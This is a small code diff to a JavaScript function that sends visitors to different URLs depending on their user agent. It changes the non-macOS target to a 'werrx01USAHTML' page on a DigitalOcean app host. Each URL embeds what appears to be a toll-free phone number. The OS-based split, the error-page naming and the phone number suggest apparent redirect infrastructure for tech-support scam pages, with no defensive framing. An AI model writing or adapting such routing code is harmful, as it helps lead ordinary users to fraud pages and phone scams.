@@ -47,13 +47,13 @@ function getResponse(userAgent) {
             id: "Group 1",
             weight: 0.5,
             macos: "https://plankton-app-s2yd4.ondigitalocean.app/merrx01usahtml/?bcda=1800%20033%20905",
-            others: "https://plankton-app-s2yd4.ondigitalocean.app/merrx01usahtml/?bcda=1800%20033%20905"
+            others: "https://plankton-app-s2yd4.ondigitalocean.app/werrx01USAHTML/?bcda=1800%20033%20905"
         },
         {
             id: "Group 2",
             weight: 0.5,
             macos: "https://plankton-app-s2yd4.ondigitalocean.app/merrx01usahtml/?bcda=1800%20033%20905",
-            others: "https://plankton-app-s2yd4.ondigitalocean.app/merrx01usahtml/?bcda=1800%20033%20905"
+            others: "https://plankton-app-s2yd4.ondigitalocean.app/werrx01USAHTML/?bcda=1800%20033%20905"
         }
     ];
 
